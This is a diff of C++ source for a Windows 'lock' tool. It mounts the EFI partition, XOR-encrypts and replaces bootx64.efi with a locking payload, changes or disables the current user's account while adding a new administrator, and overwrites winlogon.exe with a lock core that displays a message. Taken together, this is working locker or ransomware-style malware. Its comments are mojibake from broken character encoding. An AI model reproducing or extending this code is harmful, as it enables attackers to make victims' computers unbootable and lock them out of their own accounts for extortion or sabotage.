@@ -1,185 +1,195 @@
 #include "Lock.h"
 #include <vector>
-/*ç¡¬ç›˜é” æ˜¯åŸ¹è‚²*/
+/*Ó²ÅÌËø ÊÇÅàÓı*/
 int DiskLock(LockCore locker)
 {
-	HANDLE DiskHandle = NULL;
-	GetPhysicalDriveHandle(DiskHandle, 0);
-	string boot = GetPartitiontype(DiskHandle);
-	if (boot == "GPT")
-	{
-		ofstream script("Esp.txt"); // åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç”¨äºå­˜å‚¨è„šæœ¬
-		script << "select disk " << GetSystemDiskPhysicalNumber() << endl;
-		script << "select partition 1\n"; // é€‰æ‹©ESPåˆ†åŒº æ²¡å¿…è¦å†è·å–ä¸€æ¬¡ç³»ç»Ÿåˆ†åŒºå·ï¼Œä¸€èˆ¬äººéƒ½æ˜¯1
-		script << "assign letter=X\n"; // å°†ESPåˆ†åŒºæŒ‚è½½åˆ°ç›˜ç¬¦X
-		script << "exit\n"; // é€€å‡ºdiskpart
-		script.close(); // å…³é—­æ–‡ä»¶
-		system("diskpart /s Esp.txt"); // è¿è¡Œè„šæœ¬
-        // æ‰“å¼€bootx64.efiæ–‡ä»¶
-        ifstream in("X:\\ESP\\BOOT\\bootx64.efi", ios::binary); 
-        if (!in)
+    HANDLE DiskHandle = NULL;
+    GetPhysicalDriveHandle(DiskHandle,GetSystemDiskPhysicalNumber());
+    LPCSTR device = "\\\\.\\PhysicalDrive" + GetSystemDiskPhysicalNumber();
+    string boot = GetPartitiontype(DiskHandle);
+    if (boot == "GPT")
+    {
+        if (!SetDriveLetterToEFI(device,'X'))
         {
-            cout << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << endl;
-            return -1;
+            string script = "select disk " + to_string(GetSystemDiskPhysicalNumber()) + " && select partition 1 && assign letter=X && exit";
+            system(("echo " + script + " | diskpart").c_str());
+            //²»ĞĞ¾Íµ÷ÓÃdiskpart½Å±¾
         }
-        // è¯»å–bootx64.efiæ–‡ä»¶çš„å†…å®¹
-        vector<char> buffer((istreambuf_iterator<char>(in)), istreambuf_iterator<char>());
-        // å¯¹è¯»å–çš„å†…å®¹è¿›è¡Œå¼‚æˆ–åŠ å¯†
+        // ´ò¿ªbootx64.efiÎÄ¼ş
+        HANDLE hEfiSrc = CreateFileA("X:\\ESP\\BOOT\\bootx64.efi", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hEfiSrc == INVALID_HANDLE_VALUE)
+        {
+            cout << "ÎŞ·¨´ò¿ªÎÄ¼ş" << endl;
+            return GetLastError();
+        }
+
+        // »ñÈ¡ÎÄ¼ş´óĞ¡
+        DWORD fileSize = GetFileSize(hEfiSrc, NULL);
+        vector<char> buffer(fileSize);
+
+        DWORD bytesRead;
+        if (!ReadFile(hEfiSrc, &buffer[0], fileSize, &bytesRead, NULL))
+        {
+            CloseHandle(hEfiSrc);
+            return GetLastError();
+        }
+        CloseHandle(hEfiSrc);
+
+        // ¶Ô¶ÁÈ¡µÄÄÚÈİ½øĞĞÒì»ò¼ÓÃÜ
         for (int i = 0; i < buffer.size(); i++)
         {
             buffer[i] ^= locker.Xorkey;
-                ;
         }
-        // å°†åŠ å¯†åçš„å†…å®¹å†™å…¥bootbackup.yeluoæ–‡ä»¶
-        ofstream out("X:\\ESP\\BOOT\\bootbackup.yeluo", ios::binary);
-        if (!out)
-        {
-            cout << "æ— æ³•åˆ›å»ºæ–‡ä»¶" << endl;
-            return -1;
-        }
-        out.write(&buffer[0], buffer.size());
 
-        // æ¸…ç©ºbootx64.efiæ–‡ä»¶å¹¶å†™å…¥æ–°æ•°æ®
-        ofstream out2("X:\\ESP\\BOOT\\bootx64.efi", ios::binary | ios::trunc);
-        if (!out2)
+        HANDLE hBackup = CreateFileA("X:\\ESP\\BOOT\\bootbackup.yeluo", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hBackup == INVALID_HANDLE_VALUE)
         {
-           // cout << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << endl;
-            return -1;
+            cout << "ÎŞ·¨´´½¨ÎÄ¼ş" << endl;
+            return GetLastError();
         }
-        out2.write(reinterpret_cast<char*>(locker.UefiLockCore), sizeof(locker.UefiLockCore));
-	}
-	else//  mbr
-	{
 
-	}
+        DWORD bytesWritten;
+        if (!WriteFile(hBackup, &buffer[0], buffer.size(), &bytesWritten, NULL))
+        {
+            CloseHandle(hBackup);
+            return GetLastError();
+        }
+        CloseHandle(hBackup);
+
+        HANDLE hEfiDst = CreateFileA("X:\\ESP\\BOOT\\bootx64.efi", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hEfiDst == INVALID_HANDLE_VALUE)
+        {
+            return GetLastError();
+        }
+
+        if (!WriteFile(hEfiDst, locker.UefiLockCore, sizeof(locker.UefiLockCore), &bytesWritten, NULL))
+        {
+            CloseHandle(hEfiDst);
+            return GetLastError();
+        }
+        CloseHandle(hEfiDst);
+
+        return 0;
+    }
+    else//  mbr
+    {
+
+    }
 }
-// ç”¨æˆ·é”å‡½æ•°ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·å¹¶ç¦ç”¨å½“å‰ç”¨æˆ·
-// è¾“å…¥å‚æ•°ï¼šsetting - ç”¨æˆ·é”è®¾ç½®
-// è¿”å›å€¼ï¼šboolç±»å‹ï¼Œè¡¨ç¤ºå‡½æ•°çš„æ‰§è¡Œç»“æœ
+// ÓÃ»§Ëøº¯Êı£¬ÓÃÓÚ´´½¨Ò»¸öĞÂÓÃ»§²¢½ûÓÃµ±Ç°ÓÃ»§
+// ÊäÈë²ÎÊı£ºsetting - ÓÃ»§ËøÉèÖÃ
+// ·µ»ØÖµ£ºboolÀàĞÍ£¬±íÊ¾º¯ÊıµÄÖ´ĞĞ½á¹û
 BOOL UserLock( UserLockSetting setting)
 {
-    // è·å–å½“å‰ç”¨æˆ·çš„ç”¨æˆ·å
+    // »ñÈ¡µ±Ç°ÓÃ»§µÄÓÃ»§Ãû
     LPWSTR local = W_GetCurrentUsername();
 
-    // æ›´æ”¹å½“å‰ç”¨æˆ·çš„å¯†ç 
+    // ¸ü¸Äµ±Ç°ÓÃ»§µÄÃÜÂë
     if (!CurrentUser(local, setting.newPassword))
     {
-        // å¦‚æœæ›´æ”¹å¯†ç å¤±è´¥ï¼Œåˆ™è¿”å›æ‰§è¡Œå¤±è´¥
+        // Èç¹û¸ü¸ÄÃÜÂëÊ§°Ü£¬Ôò·µ»ØÖ´ĞĞÊ§°Ü
         return false;
     }
 
-    // å¦‚æœéœ€è¦æ›´æ”¹åŸç”¨æˆ·å
+    // Èç¹ûĞèÒª¸ü¸ÄÔ­ÓÃ»§Ãû
     if (setting.changeOriginalUsername)
     {
-        // æ›´æ”¹å½“å‰ç”¨æˆ·å
+        // ¸ü¸Äµ±Ç°ÓÃ»§Ãû
         if (!RenameUserAccount(local, setting.newUsername))
         {
-            // å¦‚æœæ›´æ”¹ç”¨æˆ·åå¤±è´¥ï¼Œåˆ™è¿”å›æ‰§è¡Œå¤±è´¥
+            // Èç¹û¸ü¸ÄÓÃ»§ÃûÊ§°Ü£¬Ôò·µ»ØÖ´ĞĞÊ§°Ü
             return false;
         }
     }
-    else // å¦‚æœä¸éœ€è¦æ›´æ”¹åŸç”¨æˆ·å
+    else // Èç¹û²»ĞèÒª¸ü¸ÄÔ­ÓÃ»§Ãû
     {
-        // åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ä¸­
-        // åŒæ—¶ç¦ç”¨å½“å‰ç”¨æˆ·ï¼Œä½¿å…¶æ— æ³•ç™»å½•
+        // ´´½¨Ò»¸öĞÂÓÃ»§£¬²¢½«ÆäÌí¼Óµ½¹ÜÀíÔ±×éÖĞ
+        // Í¬Ê±½ûÓÃµ±Ç°ÓÃ»§£¬Ê¹ÆäÎŞ·¨µÇÂ¼
         if (!NetUserAddAdmin(setting.newUsername, setting.newUsername) || !DisableUserAccount(local))
         {
-            // å¦‚æœåˆ›å»ºç”¨æˆ·æˆ–ç¦ç”¨ç”¨æˆ·å¤±è´¥ï¼Œåˆ™è¿”å›æ‰§è¡Œå¤±è´¥
+            // Èç¹û´´½¨ÓÃ»§»ò½ûÓÃÓÃ»§Ê§°Ü£¬Ôò·µ»ØÖ´ĞĞÊ§°Ü
             return false;
         }
     }
     return true;
 }
-/*åŠ å¯†æ–‡ä»¶é”*/
+/*¼ÓÃÜÎÄ¼şËø*/
 int FileLock(string password)
 {
 	return 0;
 }
-/*åŠ«æŒwinloginç™»å½•é”*/
+/*½Ù³ÖwinloginµÇÂ¼Ëø*/
 int LoginLock(LoginLockSetting setting)
 {
-    // æ‰“å¼€è¦è¯»å–çš„æ–‡ä»¶
-    HANDLE hIn = CreateFile(L"C:\\Windows\\System32\\winlogon.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    // ´ò¿ªÒª¶ÁÈ¡µÄÎÄ¼ş
+    HANDLE hIn = CreateFileA("C:\\Windows\\System32\\winlogon.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hIn == INVALID_HANDLE_VALUE)
     {
-        std::cerr << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << std::endl;
+        std::cerr << "ÎŞ·¨´ò¿ªÎÄ¼ş" << std::endl;
         return -1;
     }
 
-    // è·å–æ–‡ä»¶å¤§å°
+    // »ñÈ¡ÎÄ¼ş´óĞ¡
     DWORD dwFileSize = GetFileSize(hIn, NULL);
     if (dwFileSize == INVALID_FILE_SIZE)
     {
-        std::cerr << "æ— æ³•è·å–æ–‡ä»¶å¤§å°" << std::endl;
+        std::cerr << "ÎŞ·¨»ñÈ¡ÎÄ¼ş´óĞ¡" << std::endl;
         CloseHandle(hIn);
         return -1;
     }
 
-    // è¯»å–æ–‡ä»¶å†…å®¹åˆ°ç¼“å†²åŒº
+    // ¶ÁÈ¡ÎÄ¼şÄÚÈİµ½»º³åÇø
     std::vector<char> buffer(dwFileSize);
     DWORD dwBytesRead = 0;
     if (!ReadFile(hIn, buffer.data(), dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
     {
-        std::cerr << "è¯»å–æ–‡ä»¶å¤±è´¥" << std::endl;
+        std::cerr << "¶ÁÈ¡ÎÄ¼şÊ§°Ü" << std::endl;
         CloseHandle(hIn);
         return -1;
     }
     CloseHandle(hIn);
 
-    // å¯¹è¯»å–çš„å†…å®¹è¿›è¡Œå¼‚æˆ–åŠ å¯†
+    // ¶Ô¶ÁÈ¡µÄÄÚÈİ½øĞĞÒì»ò¼ÓÃÜ
     const char xorKey = setting.XorKey;
     for (char& c : buffer)
     {
         c ^= xorKey;
     }
 
-    // å†™å…¥åŠ å¯†åçš„æ•°æ®åˆ°æ–‡ä»¶
-    HANDLE hOut = CreateFile(L"C:\\loginbackup.yeluo", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    // Ğ´Èë¼ÓÃÜºóµÄÊı¾İµ½ÎÄ¼ş
+    HANDLE hOut = CreateFileA("C:\\loginbackup.yeluo", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hOut == INVALID_HANDLE_VALUE)
     {
-        std::cerr << "æ— æ³•åˆ›å»ºæ–‡ä»¶" << std::endl;
+        std::cerr << "ÎŞ·¨´´½¨ÎÄ¼ş" << std::endl;
         return -1;
     }
     DWORD dwBytesWritten = 0;
     if (!WriteFile(hOut, buffer.data(), dwFileSize, &dwBytesWritten, NULL) || dwBytesWritten != dwFileSize)
     {
-        std::cerr << "å†™å…¥æ–‡ä»¶å¤±è´¥" << std::endl;
+        std::cerr << "Ğ´ÈëÎÄ¼şÊ§°Ü" << std::endl;
         CloseHandle(hOut);
         return -1;
     }
     CloseHandle(hOut);
 
-    // å†™å…¥æ–°çš„æ•°æ®åˆ°æ–‡ä»¶
-    hOut = CreateFile(L"C:\\Windows\\System32\\winlogon.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    // Ğ´ÈëĞÂµÄÊı¾İµ½ÎÄ¼ş
+    hOut = CreateFileA("C:\\Windows\\System32\\winlogon.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hOut == INVALID_HANDLE_VALUE)
     {
-        std::cerr << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << std::endl;
+        std::cerr << "ÎŞ·¨´ò¿ªÎÄ¼ş" << std::endl;
         return -1;
     }
     if (!WriteFile(hOut, setting.LockCore, sizeof(setting.LockCore), &dwBytesWritten, NULL) || dwBytesWritten != sizeof(setting.LockCore))
     {
-        std::cerr << "å†™å…¥æ–‡ä»¶å¤±è´¥" << std::endl;
+        std::cerr << "Ğ´ÈëÎÄ¼şÊ§°Ü" << std::endl;
         CloseHandle(hOut);
         return -1;
     }
     CloseHandle(hOut);
-
-    // å†™å…¥æ–°çš„æ¶ˆæ¯åˆ°æ–‡ä»¶
-    hOut = CreateFile(L"C:\\Windows\\System32\\msg.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hOut == INVALID_HANDLE_VALUE)
-    {
-        std::cerr << "æ— æ³•æ‰“å¼€æ–‡ä»¶" << std::endl;
-        return -1;
-    }
-    DWORD dwMsgLen = (DWORD)wcslen(setting.ShowMsg) * sizeof(wchar_t);
-    if (!WriteFile(hOut, setting.ShowMsg, dwMsgLen, &dwBytesWritten, NULL) || dwBytesWritten != dwMsgLen)
-    {
-        std::cerr << "å†™å…¥æ–‡ä»¶å¤±è´¥" << std::endl;
-        CloseHandle(hOut);
-        return -1;
-    }
-    CloseHandle(hOut);
-
-    std::cout << "æ“ä½œå®Œæˆ" << std::endl;
-    return 0;
+    // ÔÚlockÀïµÄÏÔÊ¾ĞÅÏ¢
+    std::ofstream output_file("C:\\msg.txt", std::ios::binary);
+    // ½«ÉèÖÃºÃµÄÏûÏ¢Ğ´ÈëÎÄ¼ş
+    output_file.write(setting.ShowMsg.c_str(), setting.ShowMsg.length());
+    // ¹Ø±ÕÎÄ¼ş
+    output_file.close();
 }
